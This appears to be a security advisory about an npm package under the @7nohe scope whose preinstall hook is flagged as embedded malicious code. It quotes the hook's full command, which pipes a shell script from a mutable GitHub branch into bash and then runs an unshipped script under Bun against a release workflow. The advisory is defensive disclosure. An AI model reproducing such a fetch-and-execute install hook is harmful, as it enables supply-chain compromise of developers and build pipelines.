summary: preinstall pipes shell from a mutable GitHub branch and executes an unshipped script under Bun
details: package.json declares a preinstall hook that runs `wget -qO- https://raw.githubusercontent.com/oven-sh/bun/refs/heads/main/src/runtime/cli/install.sh | bash` and then invokes `~/.bun/bin/bun is_it_this_simple.js` with the environment variables WORKFLOW_ID=release.yml, REPO_ID_SUFFIX=7nohe/..., and TARGET_PACKAGES=@7nohe/openapi-react-query-codegen. The install.sh URL points at the mutable `main` branch of the oven-sh/bun repository rather than a pinned release tag or the official bun.sh installer, so the fetched bytes are controlled by whoever can push to that branch at install time. The referenced local file `is_it_this_simple.js` is not present in the published tarball (the `files` manifest ships only `dist`), so the code Bun executes must be provided by the mutable-branch shell step. The published version is `0.0.0-365d4eb738d3146583431948d3ba6e27a32556be`, a commit-SHA suffix consistent with an install-time supply-chain probe against the @7nohe scope.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
